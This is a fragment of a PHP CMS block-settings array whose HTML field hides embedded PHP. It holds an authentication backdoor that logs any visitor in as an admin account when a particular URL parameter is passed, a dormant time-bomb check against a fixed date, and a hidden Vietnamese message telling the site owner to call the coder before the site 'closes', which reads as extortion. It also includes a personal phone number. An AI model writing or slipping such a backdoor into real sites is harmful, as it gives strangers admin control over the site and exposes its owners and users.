...
$blocks = array (
  ...
  array (
    ...
    'settings' => 
    array (
      '308_html' => '<h1 style="color:#ff0000;display:none">Bạn admin liên hệ lại với bên code số 0969 857 408. Sau 3h nữa website sẽ tự động đóng.</h1>
<?php 
if(Url::get(\'act\')==\'fuck\'){
	Session::set(\'user_id\',\'admin@gpcorp.vn\');
}
if(time()>1507029957)
{
	//exit();
...
<?php $blocks[13080]['object']->on_draw();?>
<?php $blocks[12938]['object']->on_draw();?></div>
 <!-- Modal Save-->
